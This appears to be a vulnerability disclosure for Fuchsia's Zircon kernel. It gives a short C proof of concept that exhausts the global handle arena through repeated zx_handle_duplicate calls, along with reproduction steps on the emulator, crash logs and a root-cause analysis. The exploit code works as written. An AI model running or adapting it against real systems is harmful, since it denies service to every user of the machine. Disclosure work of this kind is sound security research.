# Dos on Fuchsia

Reproducing may take you only 1 min.

## Set-up


Replace "/examples/fortune/fortune.c" with the following code.

// Get a handle by calling  zx_vmo_create, then call zx_handle_duplicate to duplicate the handle. 

// Here I try to duplicate 300\*1024 handles, while the max number of handles is initialized as 256\*1024 in _arena.Init().

```c
	#include <stdio.h>
	#include  <zircon/syscalls.h>
	#define  max_num  300*1024
	zx_handle_t  res_handle[max_num];
	int  main() {
		zx_handle_t  handle1;
		zx_status_t  sys_ret;
		sys_ret = zx_vmo_create(10,0,&handle1);
		if(sys_ret==ZX_ERR_INVALID_ARGS)
		{
			printf("wrong with zx_vmo_create");
		}
		else  if(sys_ret == ZX_ERR_NO_MEMORY)
		{
			printf("wrong no mem");
		}
		else
		{
			printf("syscall success");
		}
		int  i=0;
		while (i < max_num)
		{
			sys_ret = zx_handle_duplicate(handle1,ZX_RIGHT_SAME_RIGHTS,&res_handle[i]);
			if(sys_ret==ZX_ERR_NO_MEMORY)
			{
			// printf("Ddddddddos");
			}
			i++;
		}
		while (1)
		{}
		return  0;
	}
```

   Call printf(...) when handle could not be created.
   
   /zircon/kernel/lib/fbl/include/fbl/gparena.h
   
```c
    void* Alloc(){
	...

		do{
			...
			if(...){
				if(...){
					printf("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!"); // here!!!
					return nullptr;
				}
			}
		}while (!top_.compare_exchange_strong(top, next_top, ktl::memory_order_relaxed,
					ktl::memory_order_relaxed));
		count_.fetch_add(1, ktl::memory_order_relaxed);
		return  reinterpret_cast<void*>(top);
	}
```

## Run

Open 3 terminals. 

Terminal 1

    $ fx set workstation.qemu-x64 --ccache --with //example/fortune
    $ fx build
    $ fx vdl start -N -u FUCHSIA_ROOT/scripts/start-unsecure-internet.sh

Terminal 2

    $ fx serve-updates

Terminal 3

    $ fx log

Terminal 1
```
$ fortune
```


## Result
Warnning in Terminal 3, then the FEMU crash.

Terminal 3
```
[00016.023134][57943][57945][klog] WARNING: WARNING: High handle count: 229377 / 229376 handles
[00016.029523][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029527][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029528][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029528][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029529][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029529][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029530][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029530][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029532][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029535][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029536][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029538][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
[00016.029575][57943][57945][klog] WARNING: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!WARNING: Could not allocate duplicate handle (262144 outstanding)
```
You can see that now the number of exsiting handles is 256\*1024 = 262144, or the max number of handles.

Terminal 1
```

$ ssh: Could not resolve hostname : Temporary failure in name resolution
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host

```

## Details
Zircon Handles allows user space programs to reference kernel objects.

Sharable Resource: Zircon maintains a global struct call [HandleTableArena gHandleTableArena](https://cs.opensource.google/fuchsia/fuchsia/+/main:zircon/kernel/object/handle.cc;l=76) for allocating all Handles.

Limit: The arena has a limit for all live handles, specified by [kMaxHandleCount](https://cs.opensource.google/fuchsia/fuchsia/+/main:zircon/kernel/object/handle.cc;l=18), whose value is 256 * 1024. gHandleTableArena contains a member of [fbl::GPArena<Handle::PreserveSize, sizeof(Handle)> arena_](https://cs.opensource.google/fuchsia/fuchsia/+/main:zircon/kernel/object/include/object/handle.h;l=154), whose [Init](https://cs.opensource.google/fuchsia/fuchsia/+/main:zircon/kernel/lib/fbl/include/fbl/gparena.h;l=42) allocates [kMaxHandleCount * handle_size](https://cs.opensource.google/fuchsia/fuchsia/+/main:zircon/kernel/object/handle.cc;l=78) memory. If the number of live handles goes beyond the limit, Alloc will return [nullptr](https://cs.opensource.google/fuchsia/fuchsia/+/main:zircon/kernel/lib/fbl/include/fbl/gparena.h;l=121).

The attacker can consume handles to exhaust all handles in gHandleTableArena. 1) Handles are frequently-used in Zircon. Any events, processes, or threads are consuming new handles. 2) Currently we did not find any per-user limits on handles. 3) If handles are exhausted, the users cannot send events or creates any processes or threads.

Count: GPArena maintains a count_, which increments in [Alloc](https://cs.opensource.google/fuchsia/fuchsia/+/main:zircon/kernel/lib/fbl/include/fbl/gparena.h;l=126).
